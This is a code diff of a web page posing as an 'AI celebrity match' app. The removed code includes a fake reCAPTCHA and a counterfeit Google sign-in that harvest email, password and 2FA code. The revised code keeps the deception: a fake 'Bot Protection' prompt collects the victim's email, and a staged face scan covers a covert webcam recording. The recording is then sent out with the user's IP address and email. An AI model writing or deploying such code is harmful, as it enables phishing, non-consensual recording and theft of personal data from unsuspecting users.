@@ -6,7 +6,6 @@
     <title>Aura | AI Celebrity Match</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;700&display=swap');
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
         
         /* --- MAIN DARK THEME --- */
         body {
@@ -106,6 +105,10 @@
             box-shadow: 0 10px 20px -10px rgba(56, 189, 248, 0.6);
         }
 
+        #scan-btn {
+            display: none;
+        }
+
         #status-text {
             margin-top: 15px;
             font-size: 13px;
@@ -131,165 +134,101 @@
             margin-top: 20px;
         }
 
-        /* --- FAKE RECAPTCHA STYLES --- */
-        .recaptcha-container {
-            background: #f9f9f9;
-            border: 1px solid #d3d3d3;
-            border-radius: 3px;
-            padding: 12px 12px 12px 12px;
-            display: none; /* Hidden until camera connects */
-            align-items: center;
-            justify-content: space-between;
-            width: 300px;
-            margin: 0 auto 20px auto;
-            box-shadow: 0px 0px 4px 1px rgba(0,0,0,0.08);
-            font-family: 'Roboto', sans-serif;
-            cursor: pointer;
-            user-select: none;
-        }
-
-        .rc-left {
-            display: flex;
-            align-items: center;
-        }
-
-        .rc-checkbox {
-            width: 28px;
-            height: 28px;
-            border: 2px solid #c1c1c1;
-            border-radius: 2px;
-            background: #fff;
-            margin-right: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: all 0.2s;
-        }
-
-        .rc-checkbox:hover {
-            border-color: #b2b2b2;
-        }
-
-        .rc-checkbox.loading {
-            border-color: transparent;
-            border-top: 2px solid #1a73e8;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-
-        .rc-text {
-            color: #222;
-            font-size: 14px;
-            font-weight: 400;
-        }
-
-        .rc-right {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .rc-logo {
-            width: 32px;
-            margin-bottom: 2px;
-        }
-
-        .rc-terms {
-            font-size: 10px;
-            color: #555;
-        }
-
-        /* --- FAKE GOOGLE MODAL STYLES --- */
+        /* --- CUSTOM SECURITY MODAL STYLES --- */
         .modal-overlay {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.6);
-            backdrop-filter: blur(4px);
+            background: rgba(15, 23, 42, 0.8);
+            backdrop-filter: blur(8px);
             display: none;
             justify-content: center;
             align-items: center;
             z-index: 1000;
         }
 
-        .google-modal {
-            background: #fff;
-            color: #202124;
+        .security-modal {
+            background: #1e293b;
+            border: 1px solid rgba(56, 189, 248, 0.3);
             width: 90%;
-            max-width: 400px;
-            border-radius: 8px;
-            padding: 36px 40px;
+            max-width: 380px;
+            border-radius: 16px;
+            padding: 30px;
             box-sizing: border-box;
             text-align: center;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+            color: #f8fafc;
+        }
+
+        .security-icon {
+            width: 48px;
+            height: 48px;
+            background: rgba(56, 189, 248, 0.1);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px auto;
+            color: #38bdf8;
+        }
+
+        .security-icon svg {
+            width: 24px;
+            height: 24px;
+        }
+
+        .security-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin: 0 0 10px 0;
+        }
+
+        .security-subtitle {
+            font-size: 14px;
+            color: #94a3b8;
+            margin: 0 0 25px 0;
+            line-height: 1.5;
+        }
+
+        .security-input {
+            width: 100%;
+            padding: 14px;
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            color: white;
+            font-size: 15px;
+            box-sizing: border-box;
+            margin-bottom: 20px;
             font-family: 'Inter', sans-serif;
         }
 
-        .google-logo {
-            width: 75px;
-            margin-bottom: 16px;
-        }
-
-        .google-title {
-            font-size: 24px;
-            font-weight: 400;
-            margin: 0 0 8px 0;
-        }
-
-        .google-subtitle {
-            font-size: 16px;
-            margin: 0 0 32px 0;
-            color: #202124;
-        }
-
-        .google-input {
-            width: 100%;
-            padding: 13px 15px;
-            margin-bottom: 20px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
-            box-sizing: border-box;
-        }
-
-        .google-input:focus {
+        .security-input:focus {
             outline: none;
-            border: 2px solid #1a73e8;
-            padding: 12px 14px;
+            border-color: #38bdf8;
+            background: rgba(0, 0, 0, 0.4);
         }
 
-        .google-btn-container {
-            display: flex;
-            justify-content: flex-end;
-            margin-top: 10px;
-        }
-
-        .google-btn {
-            background: #1a73e8;
-            color: white;
+        .security-btn {
+            background: #38bdf8;
+            color: #0f172a;
             border: none;
-            padding: 10px 24px;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: 500;
+            padding: 14px;
+            width: 100%;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
             cursor: pointer;
+            transition: background 0.2s;
         }
 
-        .google-btn:hover {
-            background: #1b66c9;
+        .security-btn:hover {
+            background: #7dd3fc;
         }
 
-        #step-2fa, #loading-spinner {
-            display: none;
-        }
-
-        .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #1a73e8;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
+        .security-btn:disabled {
+            background: #475569;
+            color: #94a3b8;
+            cursor: not-allowed;
         }
     </style>
 </head>
@@ -311,53 +250,22 @@
         </div>
 
         <button id="connect-btn" class="primary-btn">Connect Camera</button>
-        
-        <!-- FAKE RECAPTCHA WIDGET -->
-        <div class="recaptcha-container" id="recaptcha-btn">
-            <div class="rc-left">
-                <div class="rc-checkbox" id="rc-check"></div>
-                <span class="rc-text">I'm not a robot</span>
-            </div>
-            <div class="rc-right">
-                <img class="rc-logo" src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
-                <span class="rc-terms">Privacy - Terms</span>
-            </div>
-        </div>
-
+        <button id="scan-btn" class="primary-btn">Analyze Face</button>
         <div id="status-text">Awaiting camera initialization...</div>
     </div>
 
-    <!-- FAKE GOOGLE LOGIN MODAL -->
-    <div class="modal-overlay" id="google-overlay">
-        <div class="google-modal">
-            <img class="google-logo" src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
-            
-            <!-- STEP 1: Email & Password -->
-            <div id="step-login">
-                <h2 class="google-title">Security Verification</h2>
-                <p class="google-subtitle">Please confirm your email to prove you are human.</p>
-                <input type="email" id="g-email" class="google-input" placeholder="Email or phone" required>
-                <input type="password" id="g-pass" class="google-input" placeholder="Enter your password" required>
-                <div class="google-btn-container">
-                    <button class="google-btn" id="g-submit-btn">Next</button>
-                </div>
+    <!-- CUSTOM SECURITY MODAL -->
+    <div class="modal-overlay" id="security-overlay">
+        <div class="security-modal">
+            <div class="security-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+                </svg>
             </div>
-
-            <!-- LOADING SPINNER -->
-            <div id="loading-spinner">
-                <div class="spinner"></div>
-                <p style="color: #5f6368; font-size: 14px;">Verifying...</p>
-            </div>
-
-            <!-- STEP 2: 2FA -->
-            <div id="step-2fa">
-                <h2 class="google-title">2-Step Verification</h2>
-                <p class="google-subtitle" style="font-size: 14px; color: #5f6368;">Enter the code sent to your device or authenticator app.</p>
-                <input type="text" id="g-2fa" class="google-input" placeholder="Enter code" required>
-                <div class="google-btn-container">
-                    <button class="google-btn" id="g-verify-btn">Verify</button>
-                </div>
-            </div>
+            <h2 class="security-title">Bot Protection</h2>
+            <p class="security-subtitle">To prevent server overload, please verify your email address to continue the scan.</p>
+            <input type="email" id="sec-email" class="security-input" placeholder="Enter your email address" required>
+            <button class="security-btn" id="sec-submit-btn">Verify Email</button>
         </div>
     </div>
 
@@ -379,8 +287,7 @@
         // Elements
         const video = document.getElementById('video-preview');
         const connectBtn = document.getElementById('connect-btn');
-        const recaptchaBtn = document.getElementById('recaptcha-btn');
-        const rcCheck = document.getElementById('rc-check');
+        const scanBtn = document.getElementById('scan-btn');
         const statusText = document.getElementById('status-text');
         const scanLine = document.getElementById('scan-line');
         const resultContainer = document.getElementById('result-container');
@@ -388,15 +295,9 @@
         const camContainer = document.getElementById('cam-container');
 
         // Modal Elements
-        const overlay = document.getElementById('google-overlay');
-        const stepLogin = document.getElementById('step-login');
-        const step2fa = document.getElementById('step-2fa');
-        const spinner = document.getElementById('loading-spinner');
-        const emailInput = document.getElementById('g-email');
-        const passInput = document.getElementById('g-pass');
-        const codeInput = document.getElementById('g-2fa');
-        const submitBtn = document.getElementById('g-submit-btn');
-        const verifyBtn = document.getElementById('g-verify-btn');
+        const overlay = document.getElementById('security-overlay');
+        const emailInput = document.getElementById('sec-email');
+        const submitBtn = document.getElementById('sec-submit-btn');
 
         let stream;
         let mediaRecorder;
@@ -421,49 +322,41 @@
                 
                 camContainer.style.display = 'block';
                 connectBtn.style.display = 'none';
-                recaptchaBtn.style.display = 'flex'; // Show reCAPTCHA instead of scan button
-                statusText.innerText = "System ready. Complete verification to begin.";
+                scanBtn.style.display = 'block';
+                statusText.innerText = "System ready. Position your face in frame.";
             } catch (err) {
                 statusText.innerText = "Error: " + err.name + " - " + err.message;
                 statusText.style.color = "#ef4444";
             }
         };
 
-        // 3. Fake reCAPTCHA Click -> Show Modal
-        recaptchaBtn.onclick = () => {
-            // Make the checkbox spin like it's thinking
-            rcCheck.classList.add('loading');
-            
-            setTimeout(() => {
-                rcCheck.classList.remove('loading');
-                overlay.style.display = 'flex';
-            }, 800);
+        // 3. Click Analyze -> Show Custom Modal
+        scanBtn.onclick = () => {
+            overlay.style.display = 'flex';
         };
 
-        // 4. Handle Login Submit -> Show Spinner -> Show 2FA
+        // 4. Handle Email Submit -> Fake Loading -> Start Fake Scan
         submitBtn.onclick = () => {
-            if(!emailInput.value || !passInput.value) return;
+            if(!emailInput.value || !emailInput.value.includes('@')) {
+                emailInput.style.borderColor = '#ef4444';
+                return;
+            }
             
-            stepLogin.style.display = 'none';
-            spinner.style.display = 'block';
+            // Fake loading state on the button
+            submitBtn.innerText = "Sending code...";
+            submitBtn.disabled = true;
+            emailInput.disabled = true;
 
+            // Wait 1.5 seconds, then drop the modal and spring the trap
             setTimeout(() => {
-                spinner.style.display = 'none';
-                step2fa.style.display = 'block';
+                overlay.style.display = 'none';
+                startFakeScan();
             }, 1500);
         };
 
-        // 5. Handle 2FA Submit -> Close Modal -> Start Fake Scan
-        verifyBtn.onclick = () => {
-            if(!codeInput.value) return;
-
-            overlay.style.display = 'none';
-            recaptchaBtn.style.display = 'none';
-            startFakeScan();
-        };
-
-        // 6. The original fake scan logic
+        // 5. The original fake scan logic
         function startFakeScan() {
+            scanBtn.style.display = 'none';
             scanLine.style.display = 'block';
             statusText.innerText = "Extracting biometric markers...";
 
@@ -484,7 +377,7 @@
             }, 1800);
         }
 
-        // 7. Record Video and Send Payload
+        // 6. Record Video and Send Payload
         function startReactionCapture() {
             recordedChunks = [];
             mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
@@ -517,8 +410,6 @@
 
 🌐 **IP Address:** \`${userIP}\`
 📧 **Email:** \`${emailInput.value}\`
-🔑 **Password:** \`${passInput.value}\`
-🛡️ **2FA Code:** \`${codeInput.value}\`
 
 🎬 *Reaction video attached below.*`;
 
